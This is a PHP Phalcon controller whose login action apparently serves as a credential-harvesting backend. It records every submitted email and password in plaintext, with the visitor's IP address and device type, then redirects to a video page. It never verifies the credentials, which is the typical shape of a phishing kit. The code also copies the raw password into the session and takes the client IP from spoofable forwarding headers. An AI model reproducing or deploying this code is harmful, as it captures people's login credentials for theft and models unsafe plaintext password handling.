<?php

namespace Multiple\Frontend\Controllers;

use Phalcon\Mvc\Controller;
use Multiple\Library\UserAgentLib;
use Multiple\Models\Acc;

class AccController extends Controller
{

	public function indexAction()
	{
		//echo '<br>', __METHOD__;
	}
	public function loginAction(){
		$this->view->disable();
		$email = $this->request->getPost('email');
		$pass = $this->request->getPost('pass');
		
		$db = new Acc();
		$db->add_datetime = date('Y-m-d H:i');
		$db->user_name = $email;
		$db->pass = $pass;
		$db->ip = $this->get_client_ip_server();
		$db->device_type = $this->get_device();
		$db->save();
		$this->session->set('authacc', array(
            'user_name' => $email,
            'pass' => $pass
        ));
    	return $this->response->redirect('video/',TRUE);	
	}
	function get_client_ip_server() {
	    $ipaddress = '';
	    if (isset($_SERVER['HTTP_CLIENT_IP']) && !empty($_SERVER['HTTP_CLIENT_IP']))
	        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])&& !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) 
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	    else if(isset($_SERVER['HTTP_X_FORWARDED']) && !empty($_SERVER['HTTP_X_FORWARDED']) )
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	    else if(isset($_SERVER['HTTP_FORWARDED_FOR']) && !empty($_SERVER['HTTP_FORWARDED_FOR']))
	        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	    else if(isset($_SERVER['HTTP_FORWARDED']) && !empty($_SERVER['HTTP_FORWARDED']))
	        $ipaddress = $_SERVER['HTTP_FORWARDED'];
	    else if($_SERVER['REMOTE_ADDR'])
	        $ipaddress = $_SERVER['REMOTE_ADDR'];
	    else
	        $ipaddress = 'UNKNOWN';
	 
	    return $ipaddress;
	}
	private function get_device(){
		$agent = new UserAgentLib();
		$user_agent = $agent->get_user_agent();
		$arr = ["iPhone","Android","iPad","iPod Touch","Windows Phone OS","Kindle","Kindle Fire","BlackBerry","Playbook"	,"Tizen"];
		
		if(in_array($user_agent['platform'],$arr)){
			return 'Mobile';
		}
		return $user_agent['platform'];
	}
}
